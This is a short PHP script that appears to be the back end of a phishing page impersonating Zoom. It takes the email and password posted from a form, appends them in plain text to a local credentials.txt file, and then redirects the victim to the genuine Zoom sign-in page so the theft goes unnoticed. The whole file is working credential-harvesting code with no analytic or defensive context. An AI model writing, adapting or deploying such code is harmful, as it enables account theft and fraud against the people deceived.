<?php
// Check if the form fields 'email' and 'password' are set
if (isset($_POST['email']) && isset($_POST['password'])) {
    // Get the email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Define the file path to store the credentials
    $file = 'credentials.txt';

    // Prepare the data to write (append mode)
    $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Use file_put_contents to write to the file and create it if it doesn’t exist
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
        echo "Error writing to file.";
        exit();
    }

    // Redirect the user to the official Zoom sign in page
    header('Location: https://zoom.us/signin#/login');
    exit();
} else {
    header("Content-Type: text/plain");
    echo "Please ensure both email and password are provided.";
}
?>
